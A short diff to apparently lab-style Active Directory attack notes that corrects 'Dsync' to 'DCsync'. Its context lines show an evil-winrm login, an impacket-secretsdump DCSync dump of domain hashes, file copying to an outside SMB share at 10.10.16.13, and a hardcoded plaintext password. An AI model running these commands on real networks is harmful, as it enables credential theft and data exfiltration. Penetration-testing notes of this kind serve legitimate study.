@@ -104,7 +104,7 @@ evil-winrm -u melanie -p 'Welcome123!' -i $IP
 ```
 
 ## Blind Attacks
-### Blind Dsync attack
+### Blind DCsync attack
 ```bash
 impacket-secretsdump -just-dc melanie:'Welcome123!'@$IP
 ```
@@ -130,7 +130,7 @@ copy 2022* \\10.10.16.13\share
 ##### Clean up by del the share
 `net use /d \\10.10.16.13\share`
 
-Reachable High Value Targets -> CanPSRemote -> Dsync attack
+Reachable High Value Targets -> CanPSRemote -> DCsync attack
 
 ```powershell
 $SecPassword = ConvertTo-SecureString 'Welcome123!' -AsPlainText -Force
